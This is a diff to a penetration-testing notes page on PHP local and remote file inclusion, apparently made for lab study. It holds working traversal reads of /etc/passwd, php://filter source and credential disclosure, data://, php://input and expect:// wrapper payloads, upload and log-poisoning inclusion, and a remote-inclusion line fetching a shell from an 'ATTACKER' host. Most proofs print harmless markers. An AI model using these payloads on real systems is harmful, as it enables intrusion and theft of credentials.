@@ -1,11 +1,219 @@
 ---
-title: "File Inclusion: LFI and RFI Quick Reference"
+title: "LFI / RFI"
 sidebarTitle: "File inclusion: LFI and RFI"
-description: "Find the saved traversal, PHP-wrapper, local-file inclusion, remote inclusion, and log-poisoning examples."
+description: "Enumerate file selectors, investigate path handling, read source, and verify wrapper, upload, log, and remote-inclusion branches."
 keywords: ["lfi", "rfi", "file inclusion", "path traversal", "php wrappers", "log poisoning", "php filter"]
 ---
 
 {/* Generated from Web/LFI - RFI.md. Edit the Markdown source, then run scripts/sync_site.py. */}
+
+Start with a feature that selects a server-side resource: a language, page, template, download, or document. Establish whether the application reads a file, includes it through an interpreter, or selects from fixed identifiers. File disclosure and code execution require different evidence.
+
+## Map the file operation
+
+1. Save a request using a valid value and compare an invalid value.
+2. Identify path information in errors, appended extensions, prefixes, and a possible base directory.
+3. Try a known file appropriate to the OS, using an absolute path or traversal as the evidence suggests.
+4. Read relevant application configuration/source to understand the implementation.
+5. Consider execution only if you can identify an interpreter-capable inclusion and a controllable file or supported wrapper.
+
+```bash
+BASE='http://app.htb'
+curl -sS -G --data-urlencode 'language=en.php' "$BASE/index.php"
+curl -sS -G --data-urlencode 'language=missing-note.php' "$BASE/index.php"
+```
+
+Record the normal response and the exact invalid-value behavior. A parameter named `language` is only a lead; a fixed allowlist of identifiers may never expose a path.
+
+## Basic read and traversal checks
+
+```bash
+curl -sS -G --data-urlencode 'language=/etc/passwd' "$BASE/index.php"
+curl -sS -G --data-urlencode 'language=../../../../etc/passwd' "$BASE/index.php"
+curl -sS -G --data-urlencode 'language=C:/Windows/win.ini' "$BASE/index.php"
+```
+
+Choose the OS-appropriate branch. The traversal depth is a hypothesis about the application's working directory, not a universal number. Avoid concluding “LFI failed” from one unsuccessful depth or filename.
+
+| Observed implementation or error | Consequence for your input |
+| --- | --- |
+| `include($value)` | An absolute path or supported wrapper may be usable |
+| `include('./languages/' . $value)` | Your value begins under a directory; traversal may be needed |
+| `include('lang_' . $value)` | A filename prefix changes where traversal starts |
+| `include($value . '.php')` | The server adds an extension; `/etc/passwd` becomes a different filename |
+| File read API rather than interpreter include | Disclosure may work without any PHP execution |
+
+## Test the specific path restriction
+
+These are parameter values for Repeater. Preserve exactly which encoding layer is being tested.
+
+```text
+../../../../etc/passwd
+....//....//....//etc/passwd
+./languages/../../../../etc/passwd
+..%2f..%2f..%2fetc%2fpasswd
+%252e%252e%252f%252e%252e%252fetc%252fpasswd
+```
+
+The nested traversal form targets a single-pass removal of `../`. A permitted prefix may satisfy a weak string check without confining the resolved path. Encoded and double-encoded forms require the corresponding decoding behavior; they are not universally equivalent.
+
+When using an already encoded test in a raw URL, do not additionally apply `--data-urlencode` unless double encoding is the deliberate test:
+
+```bash
+curl --path-as-is -sS "$BASE/index.php?language=..%2f..%2f..%2fetc%2fpasswd"
+```
+
+Null-byte suffixes and path-truncation examples in older notes depend on historical runtime behavior. Keep them as version-specific leads rather than the default response to an appended extension.
+
+## Read PHP source without executing it
+
+In the PHP branch, base64 filtering can transform source before it is included, allowing the source to be displayed as text.
+
+```text
+php://filter/read=convert.base64-encode/resource=index.php
+php://filter/read=convert.base64-encode/resource=config.php
+```
+
+```bash
+curl -sS -G \
+  --data-urlencode 'language=php://filter/read=convert.base64-encode/resource=config.php' \
+  "$BASE/index.php" -o config-response.html
+
+# Copy only the returned base64 value into config.b64, then decode it locally.
+base64 -d config.b64 > config.php.txt
+```
+
+Do not decode the whole HTML response as though it were a base64 file. If the application appends `.php`, the needed resource value may instead be `config`. Read source for the actual include logic, configuration paths, database credentials, and related endpoints; then revisit the relevant service or [SQL injection notes](/web/sqli).
+
+## Enumerate parameters and file locations systematically
+
+Use a nonexistent value to establish the application-specific failure response. Replace `BASELINE_BYTES` with an observed count; validate retained hits manually.
+
+```bash
+ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
+  -u "$BASE/index.php?FUZZ=note-probe" -fs BASELINE_BYTES
+
+ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
+  -u "$BASE/index.php?language=FUZZ" -fs BASELINE_BYTES
+```
+
+If your SecLists installation uses another location, change the path. Size filtering can hide real responses when they share the same length, so inspect a sample of both matches and failures.
+
+Useful file questions are more productive than a giant unprioritized path list:
+
+| Question | Candidate locations; confirm them on the target |
+| --- | --- |
+| What OS/accounts are visible? | `/etc/passwd`, `/etc/hostname`, `C:/Windows/win.ini` |
+| Where is the application served from? | `/etc/apache2/apache2.conf`, `/etc/nginx/nginx.conf`, application error paths |
+| Which logs and include directories are configured? | `/etc/apache2/envvars`, site-specific server configuration |
+| Where is application configuration? | The paths referenced by disclosed entry points and includes |
+| Which process/environment is relevant? | Readable `/proc/self/` entries on Linux; availability depends on permissions |
+
+## PHP wrapper branches and their prerequisites
+
+| Wrapper | Purpose | Required evidence |
+| --- | --- | --- |
+| `php://filter` | Transform a readable resource, commonly for source disclosure | PHP stream handling and access to the resource |
+| `data://` | Supply inline data | For this PHP include path, `allow_url_fopen` and `allow_url_include` enabled |
+| `php://input` | Use request-body bytes as a resource | `allow_url_include` enabled and a readable raw request body; multipart handling can affect availability |
+| `expect://` | Process execution through the Expect extension | The non-default extension must actually be installed/enabled |
+| HTTP/FTP URL | Remote inclusion | For PHP, URL fetching and `allow_url_include` enabled, plus server-side reachability |
+| `zip://` or `phar://` | Reference content in an archive | Supported wrapper, readable archive, correct internal path and include behavior |
+
+For a confirmed compatible lab configuration, a fixed proof is enough before a more complex payload:
+
+```text
+data://text/plain,<?php echo "include-proof"; ?>
+expect://id
+```
+
+```bash
+curl -sS -X POST --data-binary '<?php echo "input-proof"; ?>' \
+  "$BASE/index.php?language=php://input"
+```
+
+Wrapper names are not interchangeable with file paths. Check the PHP settings from disclosed configuration where possible. The [PHP stream reference](https://www.php.net/manual/en/wrappers.php.php) documents the underlying stream behavior.
+
+## Upload plus inclusion
+
+An uploaded file does not need a PHP extension for an interpreter-based include to process PHP inside it. This is different from directly browsing an uploaded image.
+
+```bash
+printf '%s' 'GIF89a<?php echo "include-proof"; ?>' > include-proof.gif
+```
+
+Upload through the application's real flow, discover its actual stored filename/path, then include that path:
+
+```bash
+curl -sS -G \
+  --data-urlencode 'language=./profile_images/include-proof.gif' \
+  "$BASE/index.php"
+```
+
+The GIF header is only a simplistic signature demonstration; it is not a valid-image guarantee and image decoding/re-encoding may discard the PHP. A direct image response proves storage/retrieval, while seeing the evaluated proof through the inclusion route supports execution.
+
+For a ZIP-supported inclusion lab:
+
+```bash
+printf '%s' '<?php echo "zip-proof"; ?>' > proof.php
+zip proof.zip proof.php
+```
+
+```text
+zip://./uploads/proof.zip#proof.php
+```
+
+The archive must be uploaded and readable at that path. Encode `#` as part of the parameter value so it is not consumed as a client-side URL fragment.
+
+## Log or session inclusion
+
+First prove that the application can read the relevant log/session file and that you can influence text stored there. Do not assume the path, format, or readability from another machine.
+
+```bash
+# First identify a fixed marker in the readable access log.
+curl -sS -A 'lfi-log-marker-01' "$BASE/"
+curl -sS -G --data-urlencode 'language=/var/log/apache2/access.log' "$BASE/index.php"
+```
+
+If that relationship is confirmed, a small PHP proof tests whether the log is included through the interpreter:
+
+```bash
+curl -sS -A '<?php echo "log-include-proof"; ?>' "$BASE/"
+curl -sS -G --data-urlencode 'language=/var/log/apache2/access.log' "$BASE/index.php"
+```
+
+A malformed PHP fragment can break later parsing of the log, so begin with a small fixed proof. For session files, record the current session ID, configured storage directory, and an application field actually written into the session. The typical `sess_` filename pattern is a lead; the path and handler are not universal.
+
+## Remote inclusion
+
+Use a listener on your lab address and a fixed proof file. The target must be able to reach it.
+
+```bash
+printf '%s' '<?php echo "rfi-proof"; ?>' > proof.php
+python3 -m http.server 8000 --bind 0.0.0.0
+```
+
+```bash
+curl -sS -G \
+  --data-urlencode 'language=http://10.10.14.10:8000/proof.php' "$BASE/index.php"
+```
+
+A request in the listener establishes a fetch. Evaluated output establishes a different, stronger behavior. In PHP, remote inclusion is configuration-dependent; ordinary LFI does not prove RFI is available.
+
+## Failure checklist
+
+- **Blank page:** inspect status/error output; included PHP may execute without printing its source.
+- **File not found:** check working directory, prefix, appended extension, traversal depth, and actual OS.
+- **Encoded payload unchanged:** identify the layer decoding the value.
+- **Wrapper rejected:** verify runtime, extension/configuration, and whether the code uses a file API or an include.
+- **Upload chain fails:** distinguish stored filename, web URL, filesystem path, and image transformations.
+- **Remote proof never fetched:** separate disabled inclusion from routing, DNS, or egress failure.
+
+Source: synthesized from your [File Inclusion capture](/web/htb/file-inclusion). The original contains the longer transcripts; the working branches and prerequisites are collected here.
+
+## Earlier notebook reference
+
+The original shorthand is retained below. Use the context, prerequisites, and corrections above when applying these examples.
 
 Supplementary quick reference from the existing vault site. It does not mark the module as complete.
 
@@ -37,3 +245,11 @@ http://$IP/?page=http://ATTACKER/sh.php&0=id
 
 
 > Wrap traversal in filter wrappers to read PHP source without executing it — great for finding creds and more bugs.
+
+{/* VAULT_RELATED_START */}
+
+**Source material and related references**
+
+- [File Inclusion — full HTB module](/web/htb/file-inclusion) — Original lesson capture with the longer transcripts.
+
+{/* VAULT_RELATED_END */}
